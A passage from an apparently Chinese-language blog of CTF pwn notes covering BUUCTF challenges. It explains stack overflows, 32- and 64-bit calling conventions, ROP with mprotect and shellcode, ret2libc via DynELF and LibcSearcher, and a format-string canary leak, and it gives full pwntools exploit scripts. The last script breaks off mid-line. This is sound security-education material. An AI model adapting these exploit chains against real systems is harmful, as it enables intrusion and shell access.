class="line">ROPgadget --binary not_the_same_3dsctf_2016--only &quot;pop|ret&quot;|grep pop</span><br></pre></td></tr></table></figure><p>需要利用 ret 指令控制程序，所以这里需要借助用来设置三个参数的三个寄存器命令，p3_ret=0x806fcc8</p><p>ctrl+s 调出程序的段表，将.got.plt 段改为可读可写可执行，addr=0x80eb000</p><p>将返回地址填写成 read 函数，设置 read 函数的参数，之后将返回地址改为我们修改为可读可写可执行的地址，最后读入 shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mprotect函数的利用，将目标地址：.got.plt或.bss段 修改为可读可写可执行</span></span><br><span class="line"><span class="built_in">int</span> mprotect(const void *start, size_t <span class="built_in">len</span>, <span class="built_in">int</span> prot);</span><br><span class="line">argu1 为mprotect函数的第一个参数 (被修改内存的地址) 设置为 0x0x80EB000 (ida-ctrl+s 查看.got.plt/.bss起始地址) </span><br><span class="line">argu2 为mprotect函数的第二个参数 (被修改内存的大小) 设置为 <span class="number">0x1000</span> (<span class="number">0x1000</span>通过程序启动时查看该内存块的大小的到的)</span><br><span class="line">argu3 为mprotect函数的第三个参数 (被修改内存的权限) 设置为 <span class="number">7</span> = <span class="number">4</span> + <span class="number">2</span> +<span class="number">1</span> (rwx)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># ROPgadget --binary get_started_3dsctf_2016 --only &#x27;pop|ret&#x27; | grep pop</span></span><br><span class="line">pop3_addr = <span class="number">0x0806fcc8</span> <span class="comment"># pop esi ; pop ebx ; pop edx ; ret</span></span><br><span class="line">payload = <span class="number">0x2D</span> * <span class="string">&#x27;a&#x27;</span> + <span class="number">0x4</span> * <span class="string">&#x27;b&#x27;</span> + p32(elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">payload += p32(pop3_addr) <span class="comment"># 返回地址覆盖为pop3，目的为了栈还原，因为mprotect传入了三个参数，需要连续3个pop</span></span><br><span class="line">payload += p32(argu1) + p32(argu2) + p32(argu3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 紧接着返回地址为 read对修改的目标地址写入shellcode</span></span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;read&#x27;</span>]) </span><br><span class="line">payload += p32(pop3_addr) <span class="comment"># 同样栈还原，为了执行紧接着的 目标地址</span></span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(argu1) + p32(<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># read写完后 写入执行的目标地址</span></span><br><span class="line">payload += p32(argu1)</span><br><span class="line"><span class="comment"># 先进行sendline执行到read等待输入</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># 继续sendline发送shellcode</span></span><br><span class="line">sh.sendline(asm(shellcraft.sh(), arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>))</span><br><span class="line"><span class="comment"># 进入交互模式</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>完整 exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">proc_name = <span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span></span><br><span class="line">elf = ELF(proc_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这道题本地和远程两种解法，真的干。。。</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    sh = process(proc_name)</span><br><span class="line">str_flag_addr = <span class="number">0x080ECA2D</span></span><br><span class="line">    backdoor_addr = <span class="number">0x080489A0</span></span><br><span class="line">    printf_addr = <span class="number">0x0804F0A0</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="number">0x2D</span> * <span class="string">&#x27;a&#x27;</span> <span class="comment"># 这边不用覆盖ebp,在于get_flag并没有push ebp</span></span><br><span class="line">    payload += p32(backdoor_addr) + p32(printf_addr)</span><br><span class="line">    payload += p32(str_flag_addr)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28308</span>)</span><br><span class="line">    mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">    read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    pop3_edi_esi_ebx_ret = <span class="number">0x0806fcc8</span></span><br><span class="line">    mem_addr = <span class="number">0x080EB000</span> <span class="comment">#.got.plt 的起始地址</span></span><br><span class="line">    mem_size = <span class="number">0x1000</span></span><br><span class="line">    mem_type = <span class="number">0x7</span> <span class="comment"># 可执行权限</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="number">0x2D</span> * <span class="string">&#x27;a&#x27;</span></span><br><span class="line">    payload += p32(mprotect_addr)</span><br><span class="line">    payload += p32(pop3_edi_esi_ebx_ret)</span><br><span class="line">    payload += p32(mem_addr) + p32(mem_size) + p32(mem_type)</span><br><span class="line">    payload += p32(read_addr)</span><br><span class="line">    payload += p32(pop3_edi_esi_ebx_ret)</span><br><span class="line">    payload += p32(<span class="number">0</span>) + p32(mem_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line">    payload += p32(mem_addr)    <span class="comment">#将read函数的返回地址设置到我们修改的内存的地址，之后我们要往里面写入shellcode</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="comment"># read写入shellcode</span></span><br><span class="line">    payload = asm(shellcraft.sh())</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="五-32位64位栈溢出对比"><a class="markdownIt-Anchor" href="#五-32位64位栈溢出对比">#</a> 五. 32 位，64 位栈溢出对比</h2><p>32 位的函数在调用栈的时候是：</p><pre><code>   调用函数地址(父函数的栈底地址）-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1....-&gt;参数1</code></pre><p>由于在函数调用前通过 push 指令向栈中压入了数据，使得栈顶朝低地址偏移了所以在函数调用结束以后，要有恢复栈顶的过程：将通过 add esp 0x10 这条指令，即增加 esp 来恢复函数调用前的 esp。</p><p><img src="https://i.loli.net/2021/10/14/YauJBxpfHbqmUeX.png" alt="image-20211014161530117"></p><p><img src="https://i.loli.net/2021/10/14/YakGtgM3oKCUZc8.png" alt="image-20211014161545492"></p><p>64 位的函数在调用栈的时候是：</p><pre><code>   前六个参数按照约定存储在寄存器：rdi,rsi,rdx,rcx,r8,r9中。   参数超过六个的时候，第七个会压入栈中，并且先输入函数的返回地址，然后是函数的参数，之后才是函数的调用地址</code></pre><p><img src="https://i.loli.net/2021/10/14/YviIJ6DHCqbA8um.png" alt="image-20211014161246387"></p><h2 id="六-覆盖相关变量"><a class="markdownIt-Anchor" href="#六-覆盖相关变量">#</a> 六。覆盖相关变量</h2><ol><li><p>ebp</p></li><li><p>ret_addr</p></li><li><p>虚函数指针</p><p>​子类对父类的继承<br>​能够对函数进行重写<br>​由虚函数表来进行操作</p></li><li><p>SEH 链</p><p>​SEH 结构 结构 在栈中存在的 地方 ，在 在 ret_addr 和栈中数据之间 和栈中数据之间，这就导致了对于栈的安全防护 手段 ， 难以防护针对 防护针对 SEH 链的攻击</p></li><li><p>Hook 中的变量</p><p>利用方法介绍<br> 有些系统函数有预先定义好的钩子<br> 修改钩子链表中存储的子程序指针<br>影响钩子运行</p></li><li><p>fgets 的用法的时候，发现它能够避免造成溢出</p></li><li><p>程序自带的 system 函数地址</p></li><li><p>timeout: the monitored command dumped core 解决</p><p>1) 在 payload 后面加几个 ret 地址，或者加一个假的 0xdeadbeef</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>, pop_di, bin_sh_addr, system, <span class="number">0xdeadbeef</span>])</span><br></pre></td></tr></table></figure><p>2) 直接用系统函数的地址</p><h2 id="七-buuctf-例题"><a class="markdownIt-Anchor" href="#七-buuctf-例题">#</a> 七. BUUCTF 例题</h2><h3 id="1-jarvisoj-level4"><a class="markdownIt-Anchor" href="#1-jarvisoj-level4">#</a> 1. JarvisOJ level4</h3><h4 id="知识点"><a class="markdownIt-Anchor" href="#知识点">#</a> 知识点</h4><p>参考文章：<a href="https://www.anquanke.com/post/id/85129">借助 DynELF 实现无 libc 的漏洞利用小结</a></p><p>pwntools 中 DynELF 函数使用 (针对未给出 libc 文件)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">    payload=pad+p32(writeplt)+ret1+p32(<span class="number">1</span>)+p32(address)+p32(<span class="number">4</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    leak_sysaddr=io.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="comment">#print &quot;%#x =&gt; %s&quot; % (address, (leak_sysaddr or &#x27;&#x27;).encode(&#x27;hex&#x27;))   这里是测试用，可省略。</span></span><br><span class="line">    <span class="keyword">return</span> leak_sysaddr</span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&quot;对应文件&quot;</span>))</span><br><span class="line">sysaddr=d.lookup(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;libc&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pad 为填充，ret1 为有效的返回地址</p><h4 id="wp"><a class="markdownIt-Anchor" href="#wp">#</a> WP</h4><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111161018270.png" alt="image-20211116101807208"></p><p>开了 NX 保护（堆栈不可执行）</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111161046138.png" alt="image-20211116104613084"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111161046265.png" alt="image-20211116104635203"></p><p>利用 DynELF 泄露 system 地址，通过 read 函数写入 /bin/sh 到 bss 段</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">conn=process(<span class="string">&#x27;./level4&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./level4&#x27;</span>)</span><br><span class="line">pad=<span class="number">0x88</span></span><br><span class="line">write_plt=e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">vul_addr=<span class="number">0x804844b</span></span><br><span class="line">bss_addr=<span class="number">0x0804a024</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">    payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span>+p32(write_plt)+p32(vul_addr)+p32(<span class="number">1</span>)+p32(address)+p32(<span class="number">4</span>)</span><br><span class="line">    conn.sendline(payload1)</span><br><span class="line">    data=conn.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> data </span><br><span class="line">d=DynELF(leak,elf=e)</span><br><span class="line">system_addr=d.lookup(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system_addr)</span><br><span class="line">read_plt=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span>+p32(read_plt)+p32(vul_addr)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)</span><br><span class="line">conn.sendline(payload2)</span><br><span class="line">conn.send(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">payload3=<span class="string">&quot;a&quot;</span>*<span class="number">0x8c</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bss_addr)</span><br><span class="line">conn.sendline(payload3)</span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>常规解法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25934</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level4&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x8c</span> + p32(write_plt)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;read&quot;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x8c</span> + p32(system_addr)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="jarvisoj_level3_x64"><a class="markdownIt-Anchor" href="#jarvisoj_level3_x64">#</a> jarvisoj_level3_x64</h4><p>64 位 ret2libc（no canary found)</p><p>checksec</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170933327.png" alt="image-20211117093331127"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170933230.png" alt="image-20211117093259888"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170934032.png" alt="image-20211117093412861"></p><ol><li><p>泄露 libc</p><p>64 位汇编传参，当参数少于 7 个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为 7 个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和 32 位汇编一样。<br>我们这边要利用 write 函数去泄露 libc 版本<br> write 函数的原型，它有三个参数，所以我们这边需要用到三个寄存器去传参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t write(<span class="built_in">int</span> fd,const void*buf,size_t count);</span><br><span class="line">参数说明：</span><br><span class="line">  fd:是文件描述符（write所对应的是写，即就是<span class="number">1</span>）</span><br><span class="line">  buf:通常是一个字符串，需要写入的字符串</span><br><span class="line">  count：是每次写入的字节数</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>利用 ROPgadget 寻找 rdi,rsi 寄存器地址</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170944869.png" alt="image-20211117094445688"></p><p>WP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26919</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./level3_x64&#x27;)</span></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3_x64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.19.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=<span class="number">0x40061A</span></span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x4006b3</span></span><br><span class="line">rsi_r15=<span class="number">0x4006b1</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(rdi)+p64(<span class="number">1</span>)  <span class="comment">#rdi寄存器设置write函数的第一个参数为‘1’</span></span><br><span class="line">payload+=p64(rsi_r15)+p64(write_got)+p64(<span class="number">8</span>) <span class="comment">#rsi寄存器设置write函数的第二个参数为write_got表的地址，r15寄存器设置write函数的第三个参数为8</span></span><br><span class="line">payload+=p64(write_plt) <span class="comment">#去调用write函数</span></span><br><span class="line">payload+=p64(main)   <span class="comment">#控制程序流，回到main函数，继续控制</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">write_addr=u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#write_addr=u64(r.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\0&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(rdi)+p64(binsh)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="bjdctf_2020_babyrop2"><a class="markdownIt-Anchor" href="#bjdctf_2020_babyrop2">#</a> bjdctf_2020_babyrop2</h4><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171032428.png" alt="image-20211117103202380"></p><p>程序结构</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171033966.png" alt="image-20211117103343882"></p><p>init（）</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171034471.png" alt="image-20211117103404402"></p><p>gift（）</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171034134.png" alt="image-20211117103423993"></p><p>vuln（）</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171035485.png" alt="image-20211117103501439"></p><p>在 gift 函数处存在格式化字符串漏洞，可以用来泄露 libc</p><p>在 vuln 函数处存在 buf 溢出漏洞，绕过 canary 就可以利用 ret2libc 来获取 shell</p><ol><li><p>泄露 canary 值</p><p>输入 <code>%n$p</code>  来找偏移，n 为偏移量， <code>$p</code>  定位到偏移处， <code>%p</code>  以 16 进制输出</p></li></ol><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171044092.png" alt="image-20211117104417028"></p><ol start="2"><li><p>找到一个 nop 指令下断点查看栈的情况</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171057700.png" alt="image-20211117105719634"></p></li><li><p>可以看到 6161 下面有一串 16 进制数，这个就是 canary 值，利用 %7$p 就可以泄露它的值，而且看到它在栈的位置是 0x18</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171057722.png" alt="image-20211117105745656"></p><p>泄露 canary:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%7$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>另外 pwngbd 提供了一种方便的函数 fmtarg，使用格式为 fmtarg addr。在进入 printf 函数时断下，调用 fmtarg 后可以自动计算格式化参数与 addr 的偏移。fmtarg 在计算 index 时将 RDI 也算了进去，后面会自动减一作为 %$p 的参数：</p><p><img src="https://img-blog.csdnimg.cn/20200826223512973.png#pic_center" alt="在这里插入图片描述"></p><ol start="4"><li>利用 puts 函数泄露 libc，puts 函数只有一个参数，64 位传参，利用 rdi 寄存器即可，ROPgadget 找 rdi</li></ol><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171101909.png" alt="image-20211117110117854"></p></li></ol><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./bjdctf_2020_babyrop2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25998</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./bjdctf_2020_babyrop2&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%7$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">str</span>(canary)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400993</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vul_addr = <span class="number">0x400887</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(canary)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload +=p64(pop_rdi)</span><br><span class="line">payload +=p64(puts_got)</span><br><span class="line">payload +=p64(puts_plt)+p64(vul_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;story!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span 